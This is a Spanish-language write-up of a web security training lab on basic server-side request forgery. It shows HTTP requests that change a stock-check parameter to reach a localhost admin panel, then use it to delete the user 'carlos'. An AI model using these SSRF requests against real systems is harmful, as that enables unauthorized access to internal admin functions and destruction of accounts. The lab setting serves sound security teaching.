# Lab 1: Basic SSRF against the local server

Al acceder a un producto, se procede a darle clic a CHECK STOCK:

<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

Lo anterior genera la siguiente peticion:

```
POST /product/stock HTTP/2
Host: 0a3d000e04bc735185976db6006f0010.web-security-academy.net
Cookie: session=sJJg6IkReCjOdJE83MuyEfgw9UKSo744
Content-Length: 108
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Content-Type: application/x-www-form-urlencoded
Accept-Language: es-CO
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Origin: https://0a3d000e04bc735185976db6006f0010.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a3d000e04bc735185976db6006f0010.web-security-academy.net/product?productId=14
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D14%26storeId%3D1
```

Y responde asi:

```
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3

872
```

Intentamos realizar un ataque de SSRF reemplazando el valor de stockApi:

```
POST /product/stock HTTP/2
Host: 0a3d000e04bc735185976db6006f0010.web-security-academy.net
Cookie: session=sJJg6IkReCjOdJE83MuyEfgw9UKSo744
Content-Length: 31
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Content-Type: application/x-www-form-urlencoded
Accept-Language: es-CO
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Origin: https://0a3d000e04bc735185976db6006f0010.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a3d000e04bc735185976db6006f0010.web-security-academy.net/product?productId=14
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

stockApi=http://localhost/admin
```

Y lo anterior da como respuesta:

<figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

La respuesta previa indica que el aplicativo web si es vulnerable a SSRF y podriamos por ejemplo intentar eliminar un usuario asi:

```
POST /product/stock HTTP/2
Host: 0a3d000e04bc735185976db6006f0010.web-security-academy.net
Cookie: session=sJJg6IkReCjOdJE83MuyEfgw9UKSo744
Content-Length: 54
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Content-Type: application/x-www-form-urlencoded
Accept-Language: es-CO
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Origin: https://0a3d000e04bc735185976db6006f0010.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a3d000e04bc735185976db6006f0010.web-security-academy.net/product?productId=14
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

stockApi=http://localhost/admin/delete?username=carlos
```

Al revisar la respuesta tendremos lo siguiente:

```
HTTP/2 302 Found
Location: /admin
Set-Cookie: session=mWs0sJitRQeWTssrE0TM9i0tRpFMRWEi; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0


```

Y si consumimos nuevamente la siguiente peticion:

```
POST /product/stock HTTP/2
Host: 0a3d000e04bc735185976db6006f0010.web-security-academy.net
Cookie: session=sJJg6IkReCjOdJE83MuyEfgw9UKSo744
Content-Length: 31
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Content-Type: application/x-www-form-urlencoded
Accept-Language: es-CO
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Origin: https://0a3d000e04bc735185976db6006f0010.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a3d000e04bc735185976db6006f0010.web-security-academy.net/product?productId=14
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

stockApi=http://localhost/admin
```

Se lograra apreciar que se elimino el usuario:

<figure><img src="../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
